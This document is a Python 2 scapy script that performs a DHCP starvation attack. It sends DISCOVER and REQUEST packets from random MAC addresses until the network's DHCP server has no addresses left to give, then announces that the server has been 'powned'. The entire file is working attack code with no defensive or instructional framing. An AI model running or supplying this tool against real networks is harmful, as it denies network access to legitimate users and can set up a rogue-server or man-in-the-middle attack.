#!/usr/bin/env python

from scapy.all import *
import string,binascii,signal,sys,threading,socket,struct,getopt
from sys import stdout
import time

conf.verb = False
interface = sys.argv[1]
hostname='toto'
randxid = 0

global nomore_ip
global ack_received
ack_received = False
nomore_ip = False


def randomMAC():
    mac = [ 0x60, 0x67, 0x20, 
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def unpackMAC(binmac):
    mac=binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)

class sniff_dhcp(threading.Thread):
    def __init__ (self):
        threading.Thread.__init__(self)
        self.filter = "udp and src port 67 and dst port 68"
    def run(self):
            global nomore_ip
            sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=10,iface=interface)
            print ""
            print " ####### DHCP server powned !! #########"
            print ""
            nomore_ip = True

    def detect_dhcp(self,pkt):
        global ack_received
        if DHCP in pkt:
            if pkt[DHCP] and pkt[DHCP].options[0][1] == 2: ## DHCP OFFER RECEIVED
                xid=pkt[BOOTP].xid
                if xid == randxid:
                    ip_src = pkt[IP].src
                    mac_src = pkt[Ether].src
                    subnet = ""
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'subnet_mask':
                            subnet=opt[1]
                            break
 
                    proposed_ip=pkt[BOOTP].yiaddr
                    server_ip=ip_src
                    my_mac=unpackMAC(pkt[BOOTP].chaddr)
                    print "DHCP offer received for " + proposed_ip

                    dhcp_req = Ether(src=my_mac,dst="ff:ff:ff:ff:ff:ff")/ \
                               IP(src="0.0.0.0",dst="255.255.255.255")/ \
                               UDP(sport=68,dport=67)/ \
                               BOOTP(chaddr=[mac2str(my_mac)],xid=randxid)/ \
                               DHCP(options=[("message-type","request"),    \
                                             ("server_id",server_ip),       \
                                             ("requested_addr",proposed_ip),  \
                                             ("hostname",hostname),             \
                                             ("param_req_list",str("011c02030f06770c2c2f1a792a".decode('hex'))),
                                             "end"])

                    sendp(dhcp_req, iface=interface)
                    print "DHCP request sent for " + proposed_ip + " !"

            if pkt[DHCP] and pkt[DHCP].options[0][1] == 5:  ## DHCP ACK RECEIVED
                xid=pkt[BOOTP].xid
                if xid == randxid:
                    my_ip=pkt[BOOTP].yiaddr
                    server_ip=pkt[BOOTP].siaddr
                    print "DHCP ACK received -> " + my_ip + " RESERVED !!"
                    ack_received = True
                    exit(1)


print ""
print " ########### DHCP ATTACK ######## "
print ""


while nomore_ip == False:
    srcm=randomMAC()
    randxid=random.randint(1, 900000000)

    sniff_dhcp().start()

    dhcp_discover =  Ether(src=srcm,dst="ff:ff:ff:ff:ff:ff")/ \
                     IP(src="0.0.0.0",dst="255.255.255.255")/ \
                     UDP(sport=68,dport=67)/ \
                     BOOTP(chaddr=[mac2str(srcm)],xid=randxid)/ \
                     DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
    
    sendp(dhcp_discover,iface=interface)
    print "DHCP_Discover sent for MAC=[" + srcm + "]"

    while ack_received == False and nomore_ip == False:
        pass
    ack_received = False
    print " ---------------------------------------------------------- "
